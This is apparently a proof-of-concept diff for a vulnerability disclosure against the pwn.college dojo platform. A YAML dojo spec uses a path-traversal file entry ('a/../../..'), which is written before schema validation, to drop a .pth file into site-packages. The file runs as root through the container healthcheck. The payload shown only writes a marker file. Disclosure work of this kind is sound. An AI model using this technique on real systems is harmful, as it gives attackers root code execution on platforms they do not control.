@@ -1,11 +1,44 @@
-# PHASE 1 — the dojo as it looks when you first create it.
-# No `files:` block, so `dojo_create` succeeds for an ordinary user.
-# After the dojo exists, swap in dojo.phase2.yml. See README.md.
+# A dojo that looks entirely ordinary, and writes a root-owned file into the
+# CTFd container every time it is loaded.
+#
+# Why it works:
+#   dojo_plugin/utils/dojo.py:336   dojo_initialize_files(data, dojo_dir)   <- writes
+#   dojo_plugin/utils/dojo.py:342   DOJO_SPEC.validate(data)                <- validates
+#
+# The write happens first, so `path` is raw YAML at the moment it is used.
+#
+# The path below is also schema-VALID, which matters: FILE_PATH_REGEX is
+#   ^[A-Za-z0-9_][A-Za-z0-9-_./]*$
+# so it only forbids a leading '/', and permits '.' and '/' everywhere after
+# character one. `a/../../..` therefore passes validation *and* escapes the
+# dojo directory — the request returns HTTP 200 and leaves nothing in the logs.
+#
+# The `a/` prefix does a second job. dojo_initialize_files checks
+#   :313  assert not abs_path.is_symlink()
+#   :314  if abs_path.exists(): continue
+# before it runs
+#   :316  abs_path.parent.mkdir(parents=True, exist_ok=True)
+# Component `a` does not exist yet when those two checks run, so both stat()
+# calls fail with ENOENT and both guards pass. mkdir then creates `a`, and only
+# afterwards does open(abs_path, "w") resolve to the real target — so this is an
+# arbitrary root *overwrite*, not merely a create.
 
 id: totally-normal-dojo
 name: Totally Normal Dojo
 type: public
 image: pwncollege/challenge-simple
+
+files:
+  # A .pth file in site-packages: every line starting with `import` is executed
+  # on every Python start. The container's own Docker healthcheck runs
+  # `python -c ...` every 10 seconds (docker-compose.yml:161-171), so this fires
+  # as root within 10s with no restart and no further interaction.
+  #
+  # Payload is deliberately inert — it writes a marker file and nothing else.
+  - type: text
+    path: a/../../../../../../../../opt/venv/lib/python3.13/site-packages/zz_poc_d01.pth
+    content: |
+      import os, sys, pathlib; pathlib.Path("/tmp/POC_D01_PWNED").write_text("pwned as uid=%d via %r" % (os.getuid(), sys.argv))
 
 modules:
   - id: module
